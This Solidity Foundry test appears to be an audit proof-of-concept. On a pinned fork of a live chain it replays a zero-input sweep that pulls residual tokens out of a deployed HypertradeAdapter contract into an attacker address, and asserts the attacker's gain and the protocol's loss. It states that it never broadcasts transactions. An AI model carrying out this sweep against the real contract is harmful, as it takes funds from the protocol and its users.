// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {HypertradeAdapter} from "../contracts/periphery/HypertradeAdapter.sol";
import {AdapterAttacker} from "./Mocks.sol";

/// @notice Opt-in pinned-fork replay. This file is intentionally not matched by
/// the default `poc/*.t.sol` local-model command. It never seeds/donates a
/// residual, changes storage, unpauses, pranks an admin, or broadcasts a tx.
///
/// Required environment:
///   HYPEREVM_RPC_URL, HYPEREVM_PIN_BLOCK, HYPERTRADE_ADAPTER,
///   REPLAY_TOKEN_IN, REPLAY_TOKEN_OUT, REPLAY_ATTACKER
/// Command:
///   forge test --match-path poc/MainnetReplay.sol -vvv
contract MainnetReplayTest is Test {
    function test_Fork_HypertradeActualResidualZeroInputSweep() public {
        string memory rpc = vm.envString("HYPEREVM_RPC_URL");
        uint256 pin = vm.envUint("HYPEREVM_PIN_BLOCK");
        uint256 forkId = vm.createFork(rpc, pin);
        vm.selectFork(forkId);

        HypertradeAdapter adapter = HypertradeAdapter(
            payable(vm.envAddress("HYPERTRADE_ADAPTER"))
        );
        address tokenIn = vm.envAddress("REPLAY_TOKEN_IN");
        address tokenOut = vm.envAddress("REPLAY_TOKEN_OUT");
        address attacker = vm.envAddress("REPLAY_ATTACKER");
        require(attacker.balance > 0, "funded local fork attacker required");

        uint256 residual = IERC20(tokenOut).balanceOf(address(adapter));
        require(residual > 0, "why_unproven: no actual adapter residual at pin");

        AdapterAttacker sweep = new AdapterAttacker();
        uint256 attackerBefore = IERC20(tokenOut).balanceOf(attacker);
        uint256 protocolBefore = residual;

        vm.prank(attacker);
        sweep.sweepHypertrade(adapter, tokenIn, tokenOut, attacker);

        int256 deltaAttacker = int256(IERC20(tokenOut).balanceOf(attacker)) - int256(attackerBefore);
        int256 deltaProtocol = int256(IERC20(tokenOut).balanceOf(address(adapter))) - int256(protocolBefore);
        int256 pnlBeforeGas = deltaAttacker; // zero input, zero modeled flash fee/slippage/collateral

        console2.log("pin_block", pin);
        console2.log("delta_attacker_token_units", deltaAttacker);
        console2.log("delta_protocol_token_units", deltaProtocol);
        console2.log("PnL_attacker_before_gas_token_units", pnlBeforeGas);
        console2.log("gas_token_cost_still_required_for_final_PnL", true);

        assertGt(deltaAttacker, 0, "zero-input route must extract actual residual");
        assertEq(deltaAttacker + deltaProtocol, 0, "residual conservation");
        assertGt(pnlBeforeGas, 0, "withdrawal assertion, not call-success assertion");
    }
}
